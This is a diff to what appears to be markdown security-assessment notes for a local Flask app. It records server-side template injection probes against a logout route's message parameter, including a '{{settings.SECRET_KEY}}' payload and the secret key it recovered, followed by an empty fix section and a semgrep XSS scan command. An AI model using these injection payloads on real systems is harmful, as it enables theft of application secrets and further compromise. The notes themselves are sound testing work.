@@ -31,3 +31,24 @@ https://cwe.mitre.org/data/definitions/400.html <br/>
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28493 <br/>
 https://security.snyk.io/vuln/SNYK-PYTHON-JINJA2-1012994 <br/>
 
+
+
+## Routes.py, Line 263
+Methodology </br>
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection </br>
+https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee </br>
+https://semgrep.dev/docs/cheat-sheets/flask-xss/ </br>
+
+1. ``` http://localhost:5000/logout?message=%22${7*7}%22``` no <br/>
+2. ``` http://localhost:5000/logout?message=%22{{7*7}}%22 ``` yes </br>
+   3. ```http://localhost:5000/logout?message={{settings.SECRET_KEY}}```
+    4.  SECRET KEY ```rbxJidmoslLOfOCCpf6k``` (BURPSUITE)
+    
+![img.png](img.png)
+
+Fix 
+
+
+
+## XSS
+semgrep --config p/minusworld.flask-xss
